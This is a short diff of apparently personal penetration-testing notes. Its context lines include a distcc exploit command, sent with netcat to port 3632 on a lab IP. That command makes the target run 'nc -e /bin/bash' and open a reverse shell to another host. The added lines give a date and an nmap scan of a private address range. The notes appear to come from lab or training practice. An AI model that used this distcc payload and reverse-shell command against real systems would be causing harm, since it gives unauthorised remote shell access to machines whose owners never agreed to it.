@@ -83,4 +83,8 @@ This instantly turns your Kali machine into a temporary web server. Now, you can
 printf "DIST00000001ARGC00000008ARGV00000002shARGV00000002-cARGV00000031nc -e /bin/bash 192.168.1.120 4444ARGD00000001X" | nc -nv 10.30.0.235 3632
 
 
+25/05/2026
+
+sudo nmap -Pn -sT -T2 —max-retries 1 -top-ports 1024 10.30.0.102-109 etc
+
 
